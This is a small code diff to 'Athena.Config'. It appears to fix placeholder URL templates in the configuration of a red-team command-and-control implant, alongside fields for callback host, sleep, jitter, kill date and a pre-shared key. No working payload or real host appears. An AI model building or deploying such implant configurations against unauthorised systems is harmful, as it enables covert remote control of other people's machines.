@@ -37,8 +37,8 @@ namespace Athena.Config
             this.killDate = DateTime.Parse("killdate");
             this.sleep = Int32.Parse("callback_interval");
             this.jitter = Int32.Parse("callback_jitter");
-            this.getURL = "callback_host:callback_url/get_uri?query_path_name";
-            this.postURL = "callback_host:callback_url/post_uri";
+            this.getURL = "callback_host:callback_port/get_uri?query_path_name";
+            this.postURL = "callback_host:callback_port/post_uri";
             this.psk = "AESPSK";
             this.param = "query_path_name";
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
